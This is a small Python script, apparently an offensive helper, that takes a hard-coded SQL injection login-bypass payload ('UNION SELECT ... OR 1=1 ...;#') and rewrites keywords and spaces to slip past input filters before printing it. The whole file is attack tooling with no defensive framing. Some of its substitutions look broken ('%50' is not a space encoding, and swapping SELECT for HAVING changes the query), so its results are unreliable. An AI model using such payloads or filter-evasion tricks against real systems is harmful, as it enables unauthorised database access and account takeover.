values = {" ": "%50", "%20": "%50", "SELECT": "HAVING", "AND":
"&&", "OR": "||"}
originalstring = "' UNION SELECT * FROM Users WHERE username ='admin' \
OR 1=1 AND username = 'admin';#" #could be set to sys.argv[1]

for item in values : 
	if item in originalstring : 
		originalstring = originalstring.replace(item,values[item])

print('[>]Final String:',originalstring)